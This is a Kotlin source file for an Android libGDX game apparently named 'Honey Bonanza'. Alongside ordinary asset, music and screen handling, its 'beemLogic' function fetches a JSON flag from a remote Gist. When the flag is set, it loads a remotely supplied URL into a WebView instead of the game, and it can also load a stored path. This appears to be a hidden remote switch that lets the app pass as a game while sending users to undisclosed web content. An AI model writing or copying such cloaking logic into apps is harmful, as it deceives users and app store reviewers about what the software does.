package com.beeand.honeybonanza.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.graphics.Color
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.beeand.honeybonanza.MainActivity
import com.beeand.honeybonanza.appContext
import com.beeand.honeybonanza.game.manager.MusicManager
import com.beeand.honeybonanza.game.manager.NavigationManager
import com.beeand.honeybonanza.game.manager.ParticleEffectManager
import com.beeand.honeybonanza.game.manager.SoundManager
import com.beeand.honeybonanza.game.manager.SpriteManager
import com.beeand.honeybonanza.game.manager.util.MusicUtil
import com.beeand.honeybonanza.game.manager.util.ParticleEffectUtil
import com.beeand.honeybonanza.game.manager.util.SoundUtil
import com.beeand.honeybonanza.game.manager.util.SpriteUtil
import com.beeand.honeybonanza.game.screens.BeeLoaderScreen
import com.beeand.honeybonanza.game.utils.advanced.AdvancedGame
import com.beeand.honeybonanza.game.utils.disposeAll
import com.beeand.honeybonanza.util.Gist
import com.beeand.honeybonanza.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext


var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isPauseGame = false

var GDX_ORIGINAL_LINK = ""
    private set

class LibGDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set
    lateinit var particleEffectManager: ParticleEffectManager private set


    val musicUtil    by lazy { MusicUtil()    }
    val soundUtil    by lazy { SoundUtil()    }
    val allAssets    by lazy { SpriteUtil.AllAssets() }
    val startAssets  by lazy { SpriteUtil.StartAssets() }
    val particleEffectUtil by lazy { ParticleEffectUtil() }


    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)
    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("Bee", MODE_PRIVATE)

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)
        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)
        particleEffectManager = ParticleEffectManager(assetManager)

        navigationManager.navigate(BeeLoaderScreen::class.java.name)

        beemLogic()
    }

    private val colorBackground = Color.valueOf("FA4A80")

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(colorBackground)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(musicUtil, assetManager)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    override fun pause() {
        super.pause()
        if (GDX_GLOBAL_isPauseGame) musicUtil.music?.pause()
    }

    override fun resume() {
        super.resume()
        if (GDX_GLOBAL_isPauseGame.not()) musicUtil.music?.play()
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun beemLogic() {
        log("beemLogic")
        activity.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.initWeb(activity.binding.webView)

        //GDX_GLOBAL_isGame = true
        //return

        val path = sharedPreferences.getString("Bobeee", "ni") ?: "ni"

        try {
            if (path == "ni") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    log("json: $getJSON")

                    if (getJSON != null) {
                        if (getJSON.already == "true") {
                            GDX_ORIGINAL_LINK = getJSON.fierce
                            activity.loadUrl(GDX_ORIGINAL_LINK)

                            //GDX_ORIGINAL_LINK = "https://www.google.test"
                            //activity.loadUrl("https://www.google.com/")
                        } else {
                            GDX_GLOBAL_isGame = true
                        }

                        //coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("True", link).apply() }
                        //activity.loadUrl(link)

                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                activity.loadUrl(path)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }
    }

}